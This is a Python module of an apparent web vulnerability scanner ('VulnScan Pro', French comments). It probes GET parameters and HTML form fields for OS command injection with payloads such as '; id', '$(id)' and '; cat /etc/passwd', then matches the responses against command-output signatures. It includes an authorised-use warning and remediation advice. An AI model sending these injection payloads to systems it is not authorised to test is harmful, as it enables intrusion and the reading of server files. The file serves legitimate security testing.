"""
Module VulnScan Pro : command_injection
Teste les injections de commandes OS en injectant des séparateurs de commandes
(; ls, && id, | whoami) dans les paramètres GET/POST.

AVERTISSEMENT : À utiliser uniquement sur des cibles autorisées.
"""
import sys
import json
import argparse
import time
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import requests

sys.path.insert(0, '..')
from core.base_module import BaseModule


CMD_PAYLOADS = [
    "; id",
    "& id",
    "| id",
    "|| id",
    "&& id",
    "; whoami",
    "| whoami",
    "&& whoami",
    "; ls -la",
    "| ls",
    "`id`",
    "$(id)",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "; ping -c 1 127.0.0.1",
    "| ping -c 1 127.0.0.1",
    "\n id\n",
    "\r id\r",
]

CMD_SIGNATURES = [
    r"\buid=\d+\(",            # uid=0(root) or uid=33(www-data)
    r"\bgid=\d+\(",            # gid=0(root)
    r"\broot\b",
    r"\bwww-data\b",
    r"\bnobody\b",
    r"\bapache\b",
    r"\bnginx\b",
    r"PING\s+\d",              # ping output
    r"\d+ bytes from 127",     # ping response
    r"total \d+",              # ls -la output
    r"drwx",                   # directory listing
    r"-rw-r",                  # file listing
    r"bin/sh",
    r"bin/bash",
]

CMDI_REFS = [
    "https://owasp.org/www-community/attacks/Command_Injection",
    "https://cwe.mitre.org/data/definitions/78.html",
    "https://portswigger.net/web-security/os-command-injection",
    "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html",
]

CMD_RE = re.compile("|".join(CMD_SIGNATURES), re.MULTILINE)


class Module(BaseModule):

    def run(self, url: str, depth: str = "normal", timeout: int = 30) -> dict:
        start = time.time()
        vulns = []
        seen = set()
        req_timeout = min(timeout, 12)

        try:
            session = requests.Session()
            session.headers["User-Agent"] = "VulnScan-Pro/1.0"
            parsed = urlparse(url)
            params = parse_qs(parsed.query, keep_blank_values=True)

            payloads = CMD_PAYLOADS[:6] if depth == "fast" else CMD_PAYLOADS

            # 1. Test GET parameters
            for param in list(params.keys()):
                if param in seen:
                    continue
                for payload in payloads:
                    test_params = {k: v[0] for k, v in params.items()}
                    test_params[param] = payload
                    test_url = urlunparse(parsed._replace(query=urlencode(test_params)))
                    try:
                        resp = session.get(test_url, timeout=req_timeout, allow_redirects=True)
                        if CMD_RE.search(resp.text):
                            seen.add(param)
                            vulns.append(self.vuln(
                                name="Injection de commande OS détectée",
                                severity="CRITICAL",
                                cvss_score=9.8,
                                endpoint=url,
                                parameter=param,
                                payload=payload.strip(),
                                description=(
                                    f"Le paramètre '{param}' est vulnérable à l'injection de commandes OS. "
                                    f"Le payload '{payload.strip()}' a provoqué l'exécution d'une commande "
                                    "système dont la sortie est reflétée dans la réponse HTTP."
                                ),
                                recommendation=(
                                    "Ne jamais passer d'entrées utilisateur à des fonctions système "
                                    "(exec, system, popen, shell_exec). "
                                    "Utiliser des APIs natives pour les opérations fichier/réseau. "
                                    "Si une commande shell est nécessaire, utiliser des listes d'arguments "
                                    "sans shell=True et valider/échapper tous les inputs."
                                ),
                                references=CMDI_REFS,
                            ))
                            break
                    except requests.exceptions.RequestException:
                        continue
                if depth == "fast" and (time.time() - start) > 15:
                    break

            # 2. Test via POST forms
            if depth != "fast":
                try:
                    from bs4 import BeautifulSoup
                    base_resp = session.get(url, timeout=req_timeout)
                    soup = BeautifulSoup(base_resp.text, "html.parser")
                    for form in soup.find_all("form")[:3]:
                        action = form.get("action", url)
                        method = form.get("method", "get").upper()
                        ep = action if action.startswith("http") else f"{parsed.scheme}://{parsed.netloc}{action}"
                        inputs = form.find_all("input")
                        for inp in inputs:
                            name = inp.get("name")
                            if not name or name in seen:
                                continue
                            for payload in payloads[:4]:
                                form_data = {i.get("name"): i.get("value", "test")
                                             for i in inputs if i.get("name")}
                                form_data[name] = payload
                                try:
                                    if method == "POST":
                                        r = session.post(ep, data=form_data, timeout=req_timeout)
                                    else:
                                        r = session.get(ep, params=form_data, timeout=req_timeout)
                                    if CMD_RE.search(r.text):
                                        seen.add(name)
                                        vulns.append(self.vuln(
                                            name="Injection de commande OS (formulaire POST)",
                                            severity="CRITICAL",
                                            cvss_score=9.8,
                                            endpoint=ep,
                                            parameter=name,
                                            payload=payload.strip(),
                                            description=(
                                                f"Le champ de formulaire '{name}' est vulnérable à l'injection OS. "
                                                "La réponse contient des signatures de sortie de commande système."
                                            ),
                                            recommendation=(
                                                "Valider et echapper tous les inputs. "
                                                "Ne pas passer d'entrées utilisateur à des shells. "
                                                "Utiliser des APIs natives au lieu de commandes système."
                                            ),
                                            references=CMDI_REFS,
                                        ))
                                        break
                                except requests.exceptions.RequestException:
                                    continue
                        if (time.time() - start) > timeout * 0.8:
                            break
                except Exception:
                    pass

        except Exception as e:
            duration = int((time.time() - start) * 1000)
            return self.error("command_injection", str(e), duration)

        duration = int((time.time() - start) * 1000)
        return self.result("command_injection", vulns, duration)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="VulnScan Pro — Command Injection Scanner")
    parser.add_argument("--url",     required=True,        help="URL cible")
    parser.add_argument("--depth",   default="normal",     help="Profondeur du scan")
    parser.add_argument("--timeout", type=int, default=30, help="Timeout en secondes")
    args = parser.parse_args()

    module = Module()
    result = module.run(args.url, args.depth, args.timeout)
    print(json.dumps(result, ensure_ascii=False))
